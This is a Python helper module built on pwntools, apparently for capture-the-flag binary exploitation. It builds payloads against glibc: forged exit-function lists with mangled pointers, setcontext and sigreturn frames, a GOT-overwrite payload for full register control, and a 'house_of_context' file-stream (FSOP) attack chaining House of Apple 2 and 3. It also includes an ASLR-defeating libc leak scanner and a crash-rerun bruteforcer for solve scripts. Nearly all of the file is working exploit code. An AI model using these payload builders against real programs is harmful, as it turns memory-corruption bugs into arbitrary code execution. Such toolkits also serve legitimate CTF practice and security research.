import sys, os, inspect
from pwnlib.args import args as _args
from pwnlib.context import context as _context
from pwnlib.rop.srop import SigreturnFrame
from pwnlib.util.packing import p64, p32, p16, flat
from .io_file import IO_FILE_plus_struct

def proc_maps_parser(data):
    """
    Read /proc/self/maps, return a clean mapping.
    """
    mappings = {}
    for line in data.split("\n"):
        addr, file = line.split()[0], line.split()[-1]
        if file not in mappings:
            mappings[file] = int(addr.split("-")[0],16)
    return mappings

def ror(n,r):
    return (2**64-1)&(n>>r|n<<(64-r))

def rol(n,r):
    return ror(n,64-r)

def mangle(ptr,key):
    return rol(ptr^key,0x11)

def demangle(ptr,key):
    return ror(ptr,0x11)^key

def mangle_kpt(enc,known):
    return demangle(enc,known)

def fake_exit_function(funcs: list[tuple[int,int]], key: int):
	if len(funcs) > 32:
		warn("Function count is greater than expected limit")
	exit_func = flat( 
		0, # ptr to next exit_function_list
		len(funcs) # length of this list
	)
	for func in funcs[::-1]: # libc goes through the exit functions in reverse
		payload = flat(
			4, # exit function type ef_cxa
			mangle(func[0],key), # mangled func ptr
			func[1], # argument
			0 # dso_handle (unused)
			)
		exit_func += payload
		
	return exit_func

def setcontext(regs, addr):
    if (not regs.get('rsp')) and addr:
        warn("rsp not set! this will crash")
    frame = SigreturnFrame()
    for reg, val in regs.items():
        setattr(frame, reg, val)
    # needed to prevent SEGFAULT
    setattr(frame, "&fpstate", addr+0x1a8)
    fpstate = {
    0x00: p16(0x37f),	# cwd
    0x02: p16(0xffff),	# swd
    0x04: p16(0x0),		# ftw
    0x06: p16(0xffff),	# fop
    0x08: 0xffffffff,	# rip
    0x10: 0x0,			# rdp
    0x18: 0x1f80,	    # mxcsr
    # 0x1c: mxcsr_mask
    # 0x20: _st[8] (0x10 bytes each)
    # 0xa0: _xmm[16] (0x10 bytes each)
    # 0x1a0: int reserved[24]
    # 0x200: [end]
    }
    return flat({
    0x00 : bytes(frame),
    #	0xf8: 0					# end of SigreturnFrame
    0x128: 0,				# uc_sigmask
    0x1a8: fpstate,			# fpstate
    })


def setcontext32(libc: ELF, **kwargs) -> (int, bytes):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt_trampoline = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    return got, flat(
        p64(0),
        p64(got + 0x218),
        p64(libc.symbols["setcontext"] + 32),
        p64(plt_trampoline) * 0x40,
        setcontext(kwargs, got+0x218),
    )

# setcontext32 (single arbitrary write in libc -> full register control) but works past 2.38 
# the idea is we fsop stderr/stdout with a file that's a houseofapple2/3 polyglot,
# and the houseofapple2 payload calls houseofapple3. we use houseofapple3 because it has
# much better RDI control, letting us jump to setcontext
# as for where we store the ucontext, we place it directly after the filestream
# for stderr, only important thing we corrupt is stdout, not a problem 
#      (because when it is, attack stdout instead)
# for stdout, we corrupt stdin/stderr/stdout pointers, which we fix by spraying &stdout 
def house_of_context(libc,file='stdout',**kwargs) -> (int, bytes):
    assert _context.bits == 64, "only support amd64!"
    assert file in ['stdout', 'stderr'], "only support stdout/stderr"

    # ensure alignment so we can tcache poison
    # i dont think its needed (file streams are always aligned) but its like 3 lines of code
    fst = libc.sym[f'_IO_2_1_{file}_']
    padding = fst & 0x8

    # add rdi, 0x10; jmp rcx
    # technically not required but you can't set r8 otherwise
    gadget = next(libc.search(b'\x48\x83\xc7\x10\xff\xe1',executable=True))

    kwargs.setdefault('rsp',libc.sym['__pthread_keys']+0x2000)
    kwargs.setdefault('&fpstate',libc.sym['__pthread_keys']+0x120)
    kwargs['uc_stack.ss_flags'] = gadget

    frame = SigreturnFrame()
    for reg, val in kwargs.items():
        setattr(frame, reg, val)

    # house of apple3 alternative path
    # calls fp._codecvt->__cd_in.step->__fct 
    #         +0x98     +0x0    +0x0  +0x28
    fp = IO_FILE_plus_struct()
    fp._IO_read_ptr = 0x1234
    fp._IO_read_end = libc.sym['setcontext'] # rcx

    # hoa2 path
    fp._IO_write_ptr = 2
    fp._IO_write_end = 1
    fp.chain = libc.sym['_IO_wfile_underflow'] # hoa3 path
  
    fp._codecvt = fst + 0xa0 + 0x30 # points to ↓
    fp.unknown2 = p64(0)*5 + p64(fst + len(bytes(fp))+8*8) # points to after the &stdout spray
    fp._lock = libc.sym['__pthread_keys']+0x110 
    fp._wide_data = fst + 0x28
    fp.vtable = libc.sym['_IO_wfile_jumps']#-0x18

    return (fst-padding), flat(
        b'A'*padding,
        bytes(fp), # fsop payload
        p64(fst)*8, # after _IO_2_1_stdout are stderr/stdin/stdout pointers, spray with &stdout
        p64(0)*2, # to satisfy hoa3 constraints (__cd_in.step.__shlib_handle == NULL)
        bytes(frame) # setcontext payload
    )

def find_libc_leak(memory_dump, target_addr, aligned=False, is_32bit=False):
    """
    given a large dump of memory, `memory_dump`,
    scan it for the lower 12 bits of `target_addr` (since aslr does not affect it),
    return the full pointer if found
    `aligned`: assume the memory dump is 8-byte aligned
    `is_32bit`: working with 32-bit program

    ex: if you get the program to do something like `write(1,stdout,0x5000)`
    you can do the following:
    libc = ELF("./libc.so.6")
    dump = p.recvn(0x5000) #  # &stdin is probably somewhere in here
    leak = find_libc_leak(dump, libc.sym["_IO_2_1_stdin_"])
    libc.address = leak - libc.sym["_IO_2_1_stdout_"]
    """
    ptr_sz = 4 if is_32bit else 8
    
    if len(memory_dump) < ptr_sz:
        error(f"Memory dump is too small to contain a {ptr_sz * 8}-bit pointer.")
        return None

    lower_12 = target_addr & 0xfff
    step = ptr_sz if aligned else 1
    matches = []
    
    # int.from_bytes is faster than struct.unpack in tight Python loops
    for i in range(0, len(memory_dump) - ptr_sz + 1, step):
        ptr = int.from_bytes(memory_dump[i:i+ptr_sz], 'little')
        if (ptr & 0xfff) == lower_12:
            matches.append((i, ptr))
            
    if not matches:
        error("No pointers matching the lower 12 bits were found in the dump.")
        return None
    
    # Get unique pointers to gracefully handle duplicates of the same leak
    unique_ptrs = list(set(ptr for offset, ptr in matches))
    if len(unique_ptrs) == 1:
        return unique_ptrs[0]
        
    # Apply heuristics for multiple distinct candidates
    va_min = 0x40000000 if is_32bit else 0x700000000000
    va_max = 0xffffffff if is_32bit else 0x7fffffffffff
    
    heuristic_matches = []
    for offset, ptr in matches:
        if va_min <= ptr <= va_max:
            heuristic_matches.append((offset, ptr))
            
    if not heuristic_matches:
        warn("No matches survived the heuristic filter. Might be wrong.")
        return matches[0][1]
        
    unique_heuristic_ptrs = list(set(ptr for offset, ptr in heuristic_matches))
    if len(unique_heuristic_ptrs) == 1:
        return unique_heuristic_ptrs[0]
        
    warn(f"Multiple distinct candidates found, returning first. All found:")
    for ptr in unique_heuristic_ptrs:
        offsets = [off for off, p in heuristic_matches if p == ptr]
        info(f"Candidate {hex(ptr)} found at offsets: {offsets[:3]}{'...' if len(offsets) > 3 else ''}")
        
    return heuristic_matches[0][1]

# stuff i commonly write in solve scripts (may move to own module in the future)

# maybe not worth stripping this one since
# A) makes it harder to share B) may forget syntax C) cannot change colon
def set_alias(p):
    p.sla = p.sendlineafter
    p.sl = p.sendline
    p.sa = p.sendafter
    p.s = p.send
    p.ru = p.readuntil
    p.rl = p.readline
    p.sc = lambda x: p.sa(b':',x)
    p.slc = lambda x: p.sla(b':',x)
    p.snc = lambda x: p.sla(b':',i2b(x))
    return p

def i2b(n: int):
    return str(n).encode()

def rerun(p):
    """
    solve script bruteforcer. add this to your solve script:
    ```python
    p = process("./bin")
    if args.RERUN:
        sys.excepthook = rerun(p)
    ```
    now `python3 solve.py RERUN` will restart your script if it crashes
    """
    path = os.path.abspath(inspect.stack()[1].filename)

    def rerun_exploit(exc_type, exc_value, exc_tb):
        try: p.close()
        except: pass
        print("one more roll")
        rerun_args = [sys.executable, path]
        rerun_args.extend([f"{k}={v}" for k, v in _args.items() if v])
        rerun_args.append(f"LOG_LEVEL={_context.log_level}")
        if os.environ.get("TRIES") is None:
            os.environ["TRIES"] = "0"
        else:
            os.environ["TRIES"] = str(int(os.environ.get("TRIES", 0)) + 1)
        print(f"tries: {os.environ['TRIES']}")
        os.execve(sys.executable, rerun_args, os.environ)

    return rerun_exploit

__all__ = [
    "proc_maps_parser",
    "ror",
    "rol",
    "mangle",
    "demangle",
    "mangle_kpt",
    "fake_exit_function",
    "setcontext",
    "setcontext32",
    "house_of_context",
    "pack_file",
    "find_libc_leak",
    "set_alias",
    "i2b",
    "rerun",
]